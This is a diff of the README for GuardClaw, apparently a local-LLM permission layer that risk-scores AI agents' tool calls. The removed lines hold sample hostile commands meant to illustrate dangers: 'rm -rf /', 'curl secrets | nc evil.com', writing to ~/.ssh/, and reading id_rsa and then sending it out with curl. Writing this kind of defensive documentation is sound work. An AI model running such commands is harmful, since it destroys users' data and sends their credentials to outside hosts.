@@ -1,30 +1,36 @@
 <p align="center">
-  <h1 align="center"><img src="docs/favicon.svg" width="36" height="36" alt="GuardClaw logo" style="vertical-align: middle;"> GuardClaw</h1>
+  <h1 align="center">
+    <img src="docs/favicon.svg" width="36" height="36" alt="GuardClaw logo" style="vertical-align: middle;">
+    GuardClaw
+  </h1>
   <p align="center">
-    <strong>Smart permission layer for AI agents — powered by local LLMs</strong>
+    <strong>Smart permission layer for AI agents, powered by local LLMs</strong>
   </p>
   <p align="center">
-    Too loose? Too tight? GuardClaw finds the right balance — 100% local, zero cloud.
+    100% local. Zero cloud. Real-time risk judgment for agent tool calls.
   </p>
 </p>
 
 <p align="center">
-  <a href="https://github.com/TobyGE/GuardClaw/blob/main/LICENSE"><img src="https://img.shields.io/github/license/TobyGE/GuardClaw" alt="License"></a>
-  <a href="https://github.com/TobyGE/GuardClaw/stargazers"><img src="https://img.shields.io/github/stars/TobyGE/GuardClaw?style=social" alt="GitHub stars"></a>
-  <a href="https://github.com/TobyGE/GuardClaw/network/members"><img src="https://img.shields.io/github/forks/TobyGE/GuardClaw?style=social" alt="GitHub forks"></a>
-  <a href="https://github.com/TobyGE/GuardClaw/actions/workflows/lint.yml"><img src="https://img.shields.io/github/actions/workflow/status/TobyGE/GuardClaw/lint.yml?label=lint" alt="Lint status"></a>
-  <a href="https://github.com/TobyGE/GuardClaw/actions/workflows/deploy-pages.yml"><img src="https://img.shields.io/github/actions/workflow/status/TobyGE/GuardClaw/deploy-pages.yml?label=pages" alt="Pages deploy status"></a>
-  <a href="https://github.com/TobyGE/GuardClaw/actions/workflows/release-guardclawbar.yml"><img src="https://img.shields.io/github/actions/workflow/status/TobyGE/GuardClaw/release-guardclawbar.yml?label=GuardClawBar%20release" alt="GuardClawBar release status"></a>
-  <img src="https://img.shields.io/badge/Local--Only-100%25-brightgreen" alt="Local only">
-  <img src="https://img.shields.io/badge/OS-macOS-blue" alt="macOS">
-  <img src="https://img.shields.io/badge/Node.js-18%2B-339933?logo=nodedotjs&logoColor=white" alt="Node.js 18+">
+  <a href="https://github.com/TobyGE/GuardClaw/blob/main/LICENSE">
+    <img src="https://img.shields.io/github/license/TobyGE/GuardClaw" alt="License">
+  </a>
+  <a href="https://github.com/TobyGE/GuardClaw/actions/workflows/lint.yml">
+    <img src="https://img.shields.io/github/actions/workflow/status/TobyGE/GuardClaw/lint.yml?label=lint" alt="Lint status">
+  </a>
+  <a href="https://github.com/TobyGE/GuardClaw/actions/workflows/deploy-pages.yml">
+    <img
+      src="https://img.shields.io/github/actions/workflow/status/TobyGE/GuardClaw/deploy-pages.yml?label=pages"
+      alt="Pages deploy status"
+    >
+  </a>
 </p>
 
 <p align="center">
   <a href="#the-problem">The Problem</a> ·
   <a href="#quick-start">Quick Start</a> ·
   <a href="#how-it-works">How It Works</a> ·
-  <a href="#dashboard">Dashboard</a> ·
+  <a href="#product-tour">Product Tour</a> ·
   <a href="docs/GUARDCLAWBAR.md">Menu Bar App</a> ·
   <a href="docs/ROADMAP.md">Roadmap</a>
 </p>
@@ -33,56 +39,29 @@
 
 ![GuardClaw Dashboard](docs/screenshots/dashboard-overview-2026-03.png)
 
-## UI Preview (Mar 2026)
-
-| Dashboard | Security Scan |
-|-----------|---------------|
-| ![Dashboard](docs/screenshots/dashboard-overview-2026-03.png) | ![Security Scan](docs/screenshots/security-scan-clean-2026-03.png) |
-
-| Judge Backend | Menu Bar |
-|---------------|----------|
-| ![Judge](docs/screenshots/judge-backend-mlx-qwen-2026-03.png) | ![Menu Bar](docs/screenshots/menubar-claude-tab-2026-03.png) |
-
 ## The Problem
 
-AI agents have a permissions problem — and it goes both ways.
+AI agents usually fail in one of two ways:
 
-<table>
-<tr>
-<td width="50%">
+- **Too loose:** dangerous operations run with little control
+- **Too strict:** safe operations keep interrupting the user
 
-### 🔓 Too Loose
-**OpenClaw / Custom Agents**
+GuardClaw sits between the agent and tools, scores each action with a local LLM, and makes a practical decision:
 
-Your agent can `rm -rf /`, `curl` your SSH keys to a remote server, or rewrite `~/.bashrc` — and nothing stops it. You only find out after the damage is done.
-
-</td>
-<td width="50%">
-
-### 🔒 Too Tight
-**Claude Code**
-
-Every `git commit`, every file edit, every `npm test` triggers a permission prompt. You spend more time pressing "Yes" than actually working. The agent that's supposed to save you time is wasting it instead.
-
-</td>
-</tr>
-</table>
-
-**GuardClaw fixes both.** It sits between your agent and its tools, using a local LLM to risk-score every operation in real time:
-
-- **Too loose?** → GuardClaw catches and blocks dangerous commands before they execute
-- **Too tight?** → GuardClaw auto-approves safe operations so you're never interrupted unnecessarily
-
-One tool, two problems solved. Everything runs locally — your code and commands never leave your machine.
+- safe actions continue without friction
+- suspicious actions are surfaced for approval
 
 ## Quick Start
 
 ### Prerequisites
 
-- [LM Studio](https://lmstudio.ai) or [Ollama](https://ollama.ai) running locally
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code), [OpenClaw](https://github.com/openclaw/openclaw), or [nanobot](https://github.com/HKUDS/nanobot)
+- [LM Studio](https://lmstudio.ai) or [Ollama](https://ollama.ai)
+- [Claude Code](https://docs.anthropic.com/en/docs/claude-code),
+  [OpenClaw](https://github.com/openclaw/openclaw),
+  [Gemini CLI](https://github.com/google-gemini/gemini-cli), or
+  [nanobot](https://github.com/HKUDS/nanobot)
 
-**Recommended model:** `qwen/qwen3-4b-2507` — fast (~2s/call), 100% accuracy on our benchmark
+Recommended model: `qwen/qwen3-4b-2507`
 
 ### Install
 
@@ -93,193 +72,126 @@ npm install && npm install --prefix client && npm run build
 npm link
 ```
 
-### For Claude Code Users
+### Claude Code
 
 ```bash
-# Install hooks into Claude Code (writes to ~/.claude/settings.json)
+# Install Claude Code hooks (writes to ~/.claude/settings.json)
 node scripts/install-claude-code.js
 
 # Start GuardClaw
 guardclaw start
 ```
 
-That's it. Every tool call is now risk-scored. Safe operations auto-approve silently:
+Safe operations can be auto-approved; high-risk operations stay in your approval path.
 
 ![Claude Code auto-approve](docs/screenshots/cc-auto-approve.png)
 
-Dangerous operations fall through to Claude Code's normal permission prompt — you only get asked when it actually matters.
-
-**What changes in practice:**
-
-| Operation | Without GuardClaw | With GuardClaw |
-|-----------|------------------|----------------|
-| `git commit -m "fix"` | ⚠️ "Allow this?" | ✅ Auto-approved |
-| `npm test` | ⚠️ "Allow this?" | ✅ Auto-approved |
-| Edit project file | ⚠️ "Allow this?" | ✅ Auto-approved |
-| Read source code | ✅ Allowed | ✅ Allowed (unchanged) |
-| `curl secrets \| nc evil.com` | ⚠️ "Allow this?" | 🚫 Falls through to prompt |
-| Write to `~/.ssh/` | ⚠️ "Allow this?" | 🚫 Falls through to prompt |
-
-GuardClaw knows *what* the user asked the agent to do, so it can judge whether each tool call makes sense in context — not just whether the command looks safe in isolation.
-
-To uninstall: `node scripts/install-claude-code.js --uninstall`
-
-### For OpenClaw Users
+Uninstall hooks:
 
 ```bash
-# Auto-detect your OpenClaw token
+node scripts/install-claude-code.js --uninstall
+```
+
+### OpenClaw
+
+```bash
+# Auto-detect token
 guardclaw config detect-token --save
 
-# Start GuardClaw (monitor mode)
+# Start in monitor mode
 guardclaw start
 ```
 
-GuardClaw connects via WebSocket and starts monitoring every tool call in real time. To also **block** dangerous commands before they execute:
+Enable active blocking:
 
 ```bash
-# Install the blocking plugin
 guardclaw plugin install
 openclaw gateway restart
-
-# Enable full tool event visibility
 bash scripts/patch-openclaw.sh
 ```
 
-| Mode | What happens |
-|------|-------------|
-| **Monitor** (default) | See every tool call with risk scores — nothing is blocked |
-| **Block** (with plugin) | Dangerous commands pause for your approval before running |
-
-Toggle between modes from the dashboard 🛡️ button — no restart needed.
-
 ## How It Works
 
-```
-                    ┌──────────────────────────────┐
-                    │         GuardClaw             │
-                    │                               │
- ┌──────────┐      │  ┌─────────┐    ┌──────────┐  │      ┌───────────┐
- │  Claude   │─────→│  │  Risk   │───→│ Decision │  │─────→│ Dashboard │
- │  Code     │      │  │  Score  │    │          │  │      │  Web UI   │
- └──────────┘      │  │(Local   │    │ allow /  │  │      └───────────┘
-                    │  │  LLM)   │    │ pass-    │  │
- ┌──────────┐      │  │         │    │ through  │  │
- │ OpenClaw │─────→│  └─────────┘    └──────────┘  │
- └──────────┘      │                               │
-                    └──────────────────────────────┘
-```
-
-1. **Agent wants to act** — run a command, edit a file, fetch a URL
-2. **GuardClaw scores it** — local LLM analyzes the tool call with full task context
-3. **Smart decision** — safe operations proceed instantly; risky ones get flagged
-4. **Full audit trail** — every decision logged in the real-time dashboard
-
-### What GuardClaw Considers
-
-It's not just pattern matching. The local LLM receives:
-
-- **The tool call itself** — what command, what file, what parameters
-- **User intent** — what did the user ask the agent to do? (via Claude Code's hook system)
-- **Working directory** — is this a project file or a system file?
-- **Chain history** — did the agent just read `~/.ssh/id_rsa` and now wants to `curl`?
-- **Memory** — has the user approved similar operations before?
-
-This context is why GuardClaw can confidently auto-approve `git commit` in your project while flagging the same command if it follows suspicious file reads.
+1. Agent calls a tool (exec, read, write, browser, etc.)
+2. GuardClaw captures context and sends it to a local judge model
+3. The model returns risk score + verdict + reasoning
+4. GuardClaw logs, allows, or gates execution based on policy
 
 ### Risk Tiers
 
-| Score | Verdict | Claude Code | OpenClaw |
-|-------|---------|-------------|----------|
-| 1–3 | ✅ **SAFE** | Auto-approved, no prompt | Logged, runs freely |
-| 4–7 | ⚠️ **WARNING** | Auto-approved, logged | Logged, runs freely |
-| 8–10 | 🛑 **HIGH RISK** | Falls through to CC prompt | Blocked for approval (with plugin) |
+| Score | Verdict | Behavior |
+| ----- | ------- | -------- |
+| 1-3 | SAFE | Runs normally |
+| 4-7 | WARNING | Runs with stronger audit signal |
+| 8-10 | HIGH RISK | Requires approval / blocking path |
 
-## Dashboard
+## Product Tour
 
-The web dashboard at `localhost:3002` gives you full visibility into what your agents are doing.
+### Dashboard
 
-### Overview
+The dashboard (`localhost:3002`) is the central control plane:
 
-| Element | Description |
-|---------|-------------|
-| **Stats cards** (Safe / Warning / Block / Total) | Click to filter by risk tier |
-| **Session tabs** | Switch between agents, sub-agents, and Claude Code sessions |
-| **Event timeline** | Tool calls grouped into conversation turns with risk scores |
-| **Details panel** | Full input/output, chain context, and LLM reasoning for any event |
+- event timeline and turn grouping
+- risk filters and decision details
+- agent/session visibility
+- blocking and fail-closed toggles
 
-### Controls
+![Dashboard](docs/screenshots/dashboard-overview-2026-03.png)
 
-| Control | What it does |
-|---------|-------------|
-| 🛡️ **Blocking toggle** | Enable/disable active blocking (OpenClaw plugin required) |
-| 🔒 **Fail-closed toggle** | Block all tools if GuardClaw goes offline |
-| 📡 **Blocking config** | Set thresholds, whitelist/blacklist patterns |
-| ⚙️ **Settings** | LLM backend, model selection, gateway token |
-| 📊 **Benchmark** | Test any model's accuracy on 30 security test cases |
+### Security Scan
 
-### Memory
+Security Scan adds static checks for MCP configuration, secrets exposure, and agentic-risk patterns.
 
-GuardClaw learns from your decisions. Approve/deny actions are recorded as generalized patterns, and future risk scores adjust automatically. After enough consistent approvals, similar commands skip the LLM entirely.
+![Security Scan](docs/screenshots/security-scan-clean-2026-03.png)
 
-Use **Mark Safe** / **Mark Risky** on any event to train memory directly.
+### Judge Settings
+
+Judge settings let you switch local backends and models (including built-in MLX flow) and verify runtime status.
+
+![Judge Settings](docs/screenshots/judge-backend-mlx-qwen-2026-03.png)
 
 ### Menu Bar App (macOS)
 
-Prefer native over browser? **[GuardClawBar](docs/GUARDCLAWBAR.md)** sits in your menu bar — approve/deny tool calls, get desktop notifications, and monitor agents without opening a tab. [Download the DMG →](https://github.com/TobyGE/GuardClaw/releases)
+[GuardClawBar](docs/GUARDCLAWBAR.md) gives native monitoring and quick actions without keeping a browser tab open.
 
-![GuardClawBar Essential](docs/screenshots/menubar-essential-offline-2026-03.png)
+![GuardClawBar](docs/screenshots/menubar-claude-tab-2026-03.png)
 
-## What's New (Mar 2026)
+## Architecture Highlights
 
-- Gemini CLI full integration landed (provider onboarding + event flow)
-- Claude Code hook and OpenClaw plugin now support one-click install/uninstall from UI
-- New **Security Scan** page for MCP config, credential, code vulnerability, and OWASP agentic checks
-- New **Judge** settings page with built-in MLX backend and model switch workflow
-- Session/event polling and SQL aggregation optimized to reduce dashboard/API overhead
-
-## Architecture
-
-- **Local LLM judge** — per-model prompt configs optimized for small models (qwen3-4b recommended)
-- **Context-aware analysis** — user intent, working directory, tool chain history, and learned patterns
-- **Chain analysis** — tracks tool sequences per session, detects multi-step exfiltration (read secrets → exfiltrate)
-- **Rule-based fast paths** — known-safe commands skip the LLM entirely (~0ms); known-dangerous patterns get instant high scores
-- **Credential scanning** — post-execution output scanning for API keys, tokens, private keys
-- **Prompt injection detection** — monitors user prompts for injection patterns
-- **SQLite persistence** — events survive restarts (WAL mode, indexed queries)
-- **SSE push** — real-time streaming to dashboard, no polling
-- **Multi-platform** — Claude Code (HTTP hooks), OpenClaw (WebSocket + plugin), nanobot (WebSocket)
+- local LLM risk judge with per-model prompt tuning
+- context-aware analysis (intent, cwd, tool history, memory)
+- chain analysis for multi-step attack detection
+- rule-based fast path for obvious safe/dangerous cases
+- SQLite persistence with real-time SSE streaming
+- multi-platform integrations: Claude Code, OpenClaw, Gemini CLI, nanobot
 
 ## CLI Reference
 
 ```bash
-guardclaw start                       # start server + open dashboard
-guardclaw stop                        # stop server
+guardclaw start
+guardclaw stop
 
-guardclaw config detect-token --save  # auto-detect gateway token
-guardclaw config set-token <token>    # manually set token
+guardclaw config detect-token --save
+guardclaw config set-token <token>
 
-guardclaw plugin install              # install OpenClaw blocking plugin
-guardclaw plugin uninstall            # remove plugin
-guardclaw plugin status               # check plugin state
+guardclaw plugin install
+guardclaw plugin uninstall
+guardclaw plugin status
 
-guardclaw help                        # show all commands
+guardclaw help
 ```
-
-## Roadmap
-
-See the [full roadmap](docs/ROADMAP.md) for details.
-
-**Coming up:** Post-execution audit with runtime taint analysis · Pollution source backtrace · Event search & filtering · Cross-session chain analysis
-
-**Recently shipped:** Gemini CLI integration · One-click CC/OpenClaw setup actions · Security Scan UI · Built-in MLX Judge backend switcher · Claude Code auto-approve with context-aware reasoning · Adaptive memory · Human feedback loop · SQLite persistence · Real-time dashboard · 3-tier verdict system (100% benchmark accuracy) · Multi-platform support
 
 ## Links
 
-- [OpenClaw](https://github.com/openclaw/openclaw) · [Claude Code](https://docs.anthropic.com/en/docs/claude-code) · [nanobot](https://github.com/HKUDS/nanobot) · [LM Studio](https://lmstudio.ai)
-- [Roadmap](docs/ROADMAP.md) · [Troubleshooting](docs/LMSTUDIO-TROUBLESHOOTING.md)
+- [Roadmap](docs/ROADMAP.md)
+- [Troubleshooting](docs/LMSTUDIO-TROUBLESHOOTING.md)
+- [OpenClaw](https://github.com/openclaw/openclaw)
+- [Claude Code](https://docs.anthropic.com/en/docs/claude-code)
+- [Gemini CLI](https://github.com/google-gemini/gemini-cli)
+- [nanobot](https://github.com/HKUDS/nanobot)
 
 ---
 
 <p align="center">
-  <sub>Built with paranoia and local LLMs. Your data never leaves your machine.</sub>
+  <sub>Built for practical agent safety. Your data stays on your machine.</sub>
 </p>
